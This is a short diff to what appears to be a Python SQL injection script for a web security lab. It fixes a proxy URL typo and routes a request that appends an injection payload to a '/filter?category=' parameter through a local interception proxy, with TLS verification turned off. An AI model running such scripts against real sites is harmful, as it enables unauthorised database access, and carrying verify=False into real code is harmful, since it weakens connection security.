@@ -2,11 +2,11 @@ import requests
 import sys
 import urllib3
 
-proxies = {'http': 'htpp://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
+proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 
 def exploit_sqli(url, payload):
     uri = '/filter?category='
-    r = requests.get( url + uri + payload)
+    r = requests.get( url + uri + payload, verify=False, proxies=proxies)
     if "Brain Power" in r.text:
         return True
     else:
